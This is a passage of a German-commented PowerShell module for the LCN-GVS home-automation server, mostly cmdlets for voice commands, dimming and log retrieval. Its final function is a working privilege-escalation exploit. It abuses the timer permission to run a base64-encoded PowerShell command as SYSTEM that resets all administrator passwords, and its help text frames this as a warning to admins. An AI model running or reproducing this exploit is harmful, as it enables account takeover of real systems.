    .EXAMPLE
        Get-LCNGVSAppSiriItem -itemTitle Wohnz*
    .EXAMPLE
        Get-LCNGVSAppSiriItem -itemTitle Wohnzimmer
    .LINK
        Get-LCNGVSAppSiriItemAsync
        Invoke-LCNGVSAppSiriCommand
        Invoke-LCNGVSAppSiriCommandAsync
        Invoke-LCNGVSAppSiriDimmingCommand
        Invoke-LCNGVSAppSiriDimmingCommandAsync
        Invoke-LCNGVSAppSiriAbsRegulatorCommand
        Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
        Invoke-LCNGVSAppSiriRelRegulatorCommand
        Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
        Invoke-LCNGVSAppSiriChangeBrightnessCommand
        Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
#>
function Get-LCNGVSAppSiriItem # Alias: Load-dic
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSAppSiriItem',
                  ConfirmImpact='Medium')]
    [Alias('Load-Dic')]
    [OutputType([LCNGVS.AppSiri.SiriItemWebService[]])]
    Param(
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='itemTitle')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", $Script:LocalizedData.GetLCNGVSAppSiriItem))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $items = $Script:AppSiriSvc.Loaddic()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "itemTitle")
                    {
                        $items.Items | Where-Object -Property Title -Like -Value $itemTitle
                    }
                    else
                    {
                        $items.Items
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Ruft das SiriItemWebService-Dictionary ab.  
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Sprachbefehle aus dem Dictionary der Sprachsteuerung abrufen.
    .EXAMPLE
        Get-LCNGVSAppSiriItemAsync
    .LINK
        Get-LCNGVSAppSiriItem
        Invoke-LCNGVSAppSiriCommand
        Invoke-LCNGVSAppSiriCommandAsync
        Invoke-LCNGVSAppSiriDimmingCommand
        Invoke-LCNGVSAppSiriDimmingCommandAsync
        Invoke-LCNGVSAppSiriAbsRegulatorCommand
        Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
        Invoke-LCNGVSAppSiriRelRegulatorCommand
        Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
        Invoke-LCNGVSAppSiriChangeBrightnessCommand
        Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
#>
function Get-LCNGVSAppSiriItemAsync # Alias: Load-dicAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSAppSiriItemAsync',
                  ConfirmImpact='Medium')]
    [Alias('Load-dicAsync')]
    [OutputType()]
    Param(
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", $Script:LocalizedData.GetLCNGVSAppSiriItem))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.LoaddicAsync()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

<#
    .SYNOPSIS
        Fuehrt den Sprachbefehl aus.  
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den angegebenen Sprachbefehle ausfuehren.
    .PARAMETER itemTitle
        Gibt den Schluesselbefehl an.
    .PARAMETER listSpeechIntent
        Gibt den sekundaeren Sprachbefehl an.
    .EXAMPLE
        Invoke-LCNGVSAppSiriCommand -itemTitle Wohnzimmer -listSpeechIntent Licht
    .EXAMPLE
        Invoke-LCNGVSAppSiriCommand -itemTitle Garage -listSpeechIntent Auf
    .LINK
        Get-LCNGVSAppSiriItem
        Get-LCNGVSAppSiriItemAsync
        Invoke-LCNGVSAppSiriCommand
        Invoke-LCNGVSAppSiriCommandAsync
        Invoke-LCNGVSAppSiriDimmingCommand
        Invoke-LCNGVSAppSiriDimmingCommandAsync
        Invoke-LCNGVSAppSiriAbsRegulatorCommand
        Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
        Invoke-LCNGVSAppSiriRelRegulatorCommand
        Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
        Invoke-LCNGVSAppSiriChangeBrightnessCommand
        Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
#>
function Invoke-LCNGVSAppSiriCommand # Alias: Execute-Command
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriItem',
                  ConfirmImpact='Medium')]
    [Alias('Execute-Command')]
    [OutputType([bool])]
    param(
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $itemTitle,

        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $listSpeechIntent
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", ($Script:LocalizedData.InvokeLCNGVSAppSiriCommand -f $itemTitle, $listSpeechIntent)))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.CommandExecute($itemTitle, $listSpeechIntent)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

<#
    .SYNOPSIS
        Fuehrt den Sprachbefehl aus.  
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den angegebenen Sprachbefehle ausfuehren.
    .PARAMETER itemTitle
        Gibt den Schluesselbefehl an.
    .PARAMETER listSpeechIntent
        Gibt den sekundaeren Sprachbefehl an.
    .EXAMPLE
        Invoke-LCNGVSAppSiriCommandAsync -itemTitle Wohnzimmer -listSpeechIntent Licht
    .EXAMPLE
        Invoke-LCNGVSAppSiriCommandAsync -itemTitle Garage -listSpeechIntent Auf
    .LINK
        Get-LCNGVSAppSiriItem
        Get-LCNGVSAppSiriItemAsync
        Invoke-LCNGVSAppSiriCommand
        Invoke-LCNGVSAppSiriDimmingCommand
        Invoke-LCNGVSAppSiriDimmingCommandAsync
        Invoke-LCNGVSAppSiriAbsRegulatorCommand
        Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
        Invoke-LCNGVSAppSiriRelRegulatorCommand
        Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
        Invoke-LCNGVSAppSiriChangeBrightnessCommand
        Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
#>
function Invoke-LCNGVSAppSiriCommandAsync # Alias: Execute-CommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriCommandAsync',
                  ConfirmImpact='Medium')]
    [Alias('Execute-CommandAsync')]
    [OutputType([bool])]
    param(
        $itemTitle,
        $listSpeechIntent
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", ($Script:LocalizedData.InvokeLCNGVSAppSiriCommand -f $itemTitle, $listSpeechIntent)))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.CommandExecuteAsync($itemTitle, $listSpeechIntent)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Invoke-LCNGVSAppSiriDimmingCommand
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriDimmingCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [string] $itemTitle,
        [string] $listSpeechIntent,
        [int] $value
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.dimmingCommand($itemTitle, $listSpeechIntent, $value)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Invoke-LCNGVSAppSiriDimmingCommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriDimmingCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [string] $itemTitle,
        [string] $listSpeechIntent,
        [int] $value
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.dimmingCommandAsync($itemTitle, $listSpeechIntent, $value)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Invoke-LCNGVSAppSiriAbsRegulatorCommand
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriAbsRegulatorCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [string] $itemTitle,
        [string] $listSpeechIntent,
        [float] $value
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.absRegulatorCommand($itemTitle, $listSpeechIntent, $value)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriAbsRegulatorCommandAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [string] $itemTitle,
        [string] $listSpeechIntent,
        [float] $value
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.absRegulatorCommandAsync($itemTitle, $listSpeechIntent, $value)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Invoke-LCNGVSAppSiriRelRegulatorCommand
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriRelRegulatorCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [string] $itemTitle,
        [string] $listSpeechIntent,
        [float] $value,
        [bool] $add
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.relRegulatorCommand($itemTitle, $listSpeechIntent, $value, $add)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Invoke-LCNGVSAppSiriRelRegulatorCommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriRelRegulatorCommandAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [string] $itemTitle,
        [string] $listSpeechIntent,
        [float] $value,
        [bool] $add
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.relRegulatorCommandAsync($itemTitle, $listSpeechIntent, $value, $add)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Invoke-LCNGVSAppSiriChangeBrightnessCommand
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriChangeBrightnessCommand',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [string] $itemTitle,
        [string] $listSpeechIntent,
        [int] $value,
        [bool] $add
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.changeBrightnessCommand($itemTitle, $listSpeechIntent, $value, $add)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

function Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSAppSiriChangeBrightnessCommandAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    param(
        [string] $itemTitle,
        [string] $listSpeechIntent,
        [int] $value,
        [bool] $add
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.AppSiri", "invoke SiriItem"))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {            
                    $Script:AppSiriSvc.changeBrightnessCommandAsync($itemTitle, $listSpeechIntent, $value, $add)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }    
}

#endregion

# -----------------------------------------------
# Webservice: Logs - Protokolle
# -----------------------------------------------
#region WebService: Logs

<#
    .SYNOPSIS
        Ruft die Log-Eintraege aus dem Logbuch ab.  
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die Log-Eintraege aus dem angegebenen Logbuch abrufen.
    .PARAMETER StartDate
        Gibt den Startzeitpunkt an.
    .PARAMETER EndDate
        Gibt den Endzeitpunkt an.
    .PARAMETER LogType
        Gibt das Logbuch an.
    .EXAMPLE
        Get-LCNGVSLogEntry -StartDate ([DateTime]::Now.AddDays(-30)) -EndDate ([DateTime]::Now) -LogType LCN-GVS
    .EXAMPLE
        Get-LCNGVSLogEntry -StartDate ([DateTime]::Now.AddDays(-30)) -EndDate ([DateTime]::Now) -LogType Ereignismelder
#>
function Get-LCNGVSLogEntry
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSLogEntry',
                  ConfirmImpact='Medium')]
    [Alias('Get-LogLCNGVS', 'Get-LogTimer', 'Get-LogMacroServer', 'Get-LogAccessControl', 'Get-LogLcnServer')]
    [OutputType()]
    Param(
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [DateTime] $StartDate,

        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [datetime] $EndDate,
        
        [Parameter(Mandatory=$true, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=2,
                   ParameterSetName='Default')]
        [ValidateSet("LCN-GVS", "Ereignismelder", "Makro", "Zeitschaltuhr", "Benutzerinteraktionen")]
        [String] $LogType
    )

    Begin
    {
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Logs", ($Script:LocalizedData.GetLCNGVSLogEntry -f $LogType)))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $logs = $null

                    switch ($LogType)
                    {
                        'LCN-GVS' { $logs = $Script:Logs1Svc.GetLogLcnServer($StartDate,$EndDate) }
                        'Ereignismelder' { $logs = $Script:Logs1Svc.GetLogAccessControl($StartDate,$EndDate) }
                        'Makro'  { $logs = $Script:Logs1Svc.GetLogMacroServer($StartDate,$EndDate) }
                        'Zeitschaltuhr'  { $logs = $Script:Logs1Svc.GetLogTimer($StartDate,$EndDate) }
                        'Benutzerinteraktionen' { $logs = $Script:Logs1Svc.GetLogLCNGVS($StartDate,$EndDate) }
                        Default  { $logs = $Script:Logs1Svc.GetLogLCNGVS($StartDate,$EndDate) }
                    }

                    Write-Output $logs.LogEntries
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
    }
}

#endregion


# -----------------------------------------------
# UserManagement
# -----------------------------------------------
<#
    .SYNOPSIS
        Setzt das Kennwort aller Benutzer vom Typ Administrator auf test123 zurueck.
    .DESCRIPTION
        Diese Funktion erzeugt ein TimerEvent, welches 3 Skunden spaeter oder zu einem bestimmten Zeitpunkt
        ein SystemCall mit SYSTEM-Rechten ausfuehrt. Dieser SystemCall startet die Windows PowerShell mit einem
        encoded-Befehl, welcher wiederum  die Konfiguration des GVS-Servers nach allen Benutzern 
        des Typs Administrator durchsucht und dessen Kennwort auf test123 festlegt.

        WARNUNG:
        --------
        Zur Ausfuehrung dieser Funktion ist nur das Benutzerrecht "TimerManagementRight" vonnoeten. Sie muessen kein
        Administrator des GVS-Servers oder des Systems sein. Es werden SYSTEM-Rechte verwendet, dadurch kann Ihr System
        komplett gekappert werden. 
        
        SCHUETZEN SIE SICH VOR GEFAHREN UND VERGEBEN SIE KEINEN BENUTZER DAS RECHT "TimerManagementRight"!
                               
    .PARAMETER  timeString
        Gibt die Zeit zur Ausfuehrung der Zuruecksetzung an.
    .EXAMPLE
        Reset-LCNGVSAdministrators -timeString "23:00:00"
#>
function Reset-LCNGVSAdministrators
{
    [CmdletBinding(DefaultParameterSetName='Default', 
                  SupportsShouldProcess=$true, 
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Reset-LCNGVSAdministrators',
                  ConfirmImpact='Medium')]
    [OutputType([bool])]
    param
    (
        [Parameter(Mandatory=$false, 
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true, 
                   ValueFromRemainingArguments=$false, 
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $timeString = ((Get-Date).AddSeconds(3)).ToLongTimeString()
    )

    Begin
    {
        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }

    Process
    {
        #ToDo: Abfrage TimerManagementRight

        # Erstellt ein neues Time-Objekt und fuegt es einem Array hinzu.
        [LCNGVS.Timer.Time[]]$times = @()
        [LCNGVS.Timer.Time]$time = [LCNGVS.Timer.Time]::new()
        [LCNGVS.Timer.AllRule]$rule = [LCNGVS.Timer.AllRule]::new()
        $rule.allow = $true
        $time.Rule = $rule
        $time.time = $timeString       
        $times += $time

        # Erstellt ein neues SystemCall-Objekt und fuegt es einem SubAction-Array hinzu.
        [LCNGVS.Timer.SubAction[]]$Actions = @()

        # Fuegt ein neues SystemCall-Objekt dem SubAction-Array hinzu.
        [LCNGVS.Timer.SystemCall]$Action = [LCNGVS.Timer.SystemCall]::new()
        $Action.Calls = 'powershell.exe -e "WwB4AG0AbABdACQAVQBzAGUAcgBzACAAPQAgAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACIAQwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABMAEMATgBHAFYAUwBcAEEAcABwAF8ARABhAHQAYQBcAGMAbwBuAGYAaQBnAFwAdQBzAGUAcgBzAC4AeABtAGwAIgANAAoAJABMAEMATgBBAGQAbQBpAG4AcwAgAD0AIAAkAFUAcwBlAHIAcwAuAFUAcwBlAHIATQBhAG4AYQBnAGUAbQBlAG4AdAAuAFUAcwBlAHIATABpAHMAdAAuAFUAcwBlAHIAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAAtAFAAcgBvAHAAZQByAHQAeQAgAHQAeQBwAGUAIAAtAEUAUQAgAC0AVgBhAGwAdQBlACAAIgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACIADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAEwAQwBOAEEAZABtAGkAbgAgAGkAbgAgACQATABDAE4AQQBkAG0AaQBuAHMAKQANAAoAewANAAoAIAAgACAAIAAkAEwAQwBOAEEAZABtAGkAbgAuAFAAYQBzAHMAdwBvAHIAZAAgAD0AIAAiAGMAYwAwADMAZQA3ADQANwBhADYAYQBmAGIAYgBjAGIAZgA4AGIAZQA3ADYANgA4AGEAYwBmAGUAYgBlAGUANQAiACAAIwAgADwAIQAtAC0AIAB0AGUAcwB0ADEAMgAzACAAKABNAEQANQAgAGgAYQBzAGgAKQAgAC0ALQA+AA0ACgB9AA0ACgANAAoAJABVAHMAZQByAHMALgBTAGEAdgBlACgAIgBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAEwAQwBOAEcAVgBTAFwAQQBwAHAAXwBEAGEAdABhAFwAYwBvAG4AZgBpAGcAXAB1AHMAZQByAHMALgB4AG0AbAAiACkA"'
        $Action.serialize = $true
        $Actions += $Action

        # Erstellt ein neues TimerEvent-Objekt und aktiviert diesen Timer.
        $TimerEvent = New-LCNGVSTimerEvent -Description "test" -Times $times -Actions $Actions -Enabled $true
        $TimerEvent.enabled = $true

        # Fuegt das TimerEvent-Objekt der Zeitschaltuhr hinzu.
        Add-LCNGVSTimerEvent -Event $TimerEvent
    }

    End
    {
    }
}